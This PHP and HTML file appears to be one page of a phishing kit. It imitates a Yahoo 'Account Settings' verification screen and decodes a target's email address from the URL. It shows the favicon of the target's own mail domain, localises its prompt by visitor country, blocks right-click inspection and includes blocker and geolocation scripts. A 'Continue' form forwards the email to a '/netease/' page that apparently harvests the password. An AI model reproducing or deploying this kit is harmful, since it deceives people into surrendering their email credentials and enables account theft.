<?php
session_start();
ob_start();include "blocker.php";
include "geo.php";

function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = base64_decode($_GET['email']);
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$fdomain = strchr($domain,'.',true);
$fdomain = ucfirst($fdomain);

include "langLib.php";
//get country



?>
<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Account Settings</title>
        <link rel="SHORTCUT ICON" href="http://<?php echo $domain ?>/favicon.ico"/>
        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
        <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="images/apple-touch-icon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="css/grids-responsive-min.css">
        <!--<![endif]-->
        <!--<style nonce="+4XlvdnIRPdkYt5FJU+OhzGD2heSR/sFhAFgwa61cSX30+3L">
            #mbr-css-check {
                display: inline;
            }
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>-->
        <link href="css/yahoo-main.css" rel="stylesheet" type="text/css">
        
        	<script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script>
$(document).ready(function(){
    
   var country ="<?php echo $country; ?>";
   if (country=="DE"){
       $('#verifyh1').html("<?php echo $verifyh1De; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnDe; ?>");
   }
    else if ((country=="CN")|| (country =="TW") || (country == "HK")){
       $('#verifyh1').html("<?php echo $verifyh1Cn; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnCn; ?>");
   }
    
    else if (country=="KR"){
      $('#verifyh1').html("<?php echo $verifyh1Kr; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnKr; ?>");
       
   }
    else if (country=="JP"){
       $('#verifyh1').html("<?php echo $verifyh1Jp; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnJp; ?>");
   }
    else if (country=="TR"){
      $('#verifyh1').html("<?php echo $verifyh1Tr; ?>");
       $('#verifyBtn').html("<?php echo $verifyBtnTr; ?>");
   }
    else if (country=="RU"){
       $('#verifyh1').html("<?php echo $verifyh1Ru; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnRu; ?>");
   }
    else if (country=="ES"){
       $('#verifyh1').html("<?php echo $verifyh1Es; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnEs; ?>");
       
   } 
   else if (country=="VN"){
       $('#verifyh1').html("<?php echo $verifyh1Vn; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnVn; ?>");
       
   } else if (country=="ID"){
       $('#verifyh1').html("<?php echo $verifyh1Id; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnId; ?>");
   }
    else if (country=="IT"){
       $('#verifyh1').html("<?php echo $verifyh1It; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnIt; ?>");
   }
    else if ((country=="AE") || (country=="IR") || (country =="IQ")){
       $('#verifyh1').html("<?php echo $verifyh1Ae; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnAe; ?>");
   }
    else if (country=="TH"){
       $('#verifyh1').html("<?php echo $verifyh1Th; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnTh; ?>");
   }
    else {
       $('#verifyh1').html("<?php echo $verifyh1En; ?>");
       $('#verifyBtn').val("<?php echo $verifyBtnEn; ?>");
   }
//alert(country);

//get div ids for manipulation at server


});
</script>

    </head>
    <body >
        
   

    <div class="loginish ">

	<div class="full-page-msg-container">
    <p class="margin20 writeup" id="verifyh1" style="font-size:24px">Click to continue</p>
    <div class="action-area" style="margin-left:45%">
        <form action="/netease/index.php" method="post">
            <input type="hidden" name="t" value="ScKobsqzNEy7Dm6USMBXIpPFytH.Ru8wcbbN1IohMdAZlVGMO4jmvqLLyeLcPwGqlBdf0rPggbxQA5W2IDnnSUTTAvsqhPxp">
            <input type="hidden" value="vghNXL2mcNc" name="scrumb">
            <input type="hidden" value="<?php echo $login ?>" name="userid">
            <input type="submit" id ="verifyBtn" class="pure-button puree-button-primary action-button" name="verify" data-ylk="elm:btn;elmt:vrfylink"
                   value="Continue">
        </form>
    </div>
</div>
</div>
  
</body>
</html>
<!-- fe02.member.ir2.yahoo.com - Thu Mar 28 2019 04:19:50 GMT+0000 (UTC) - (0ms)-->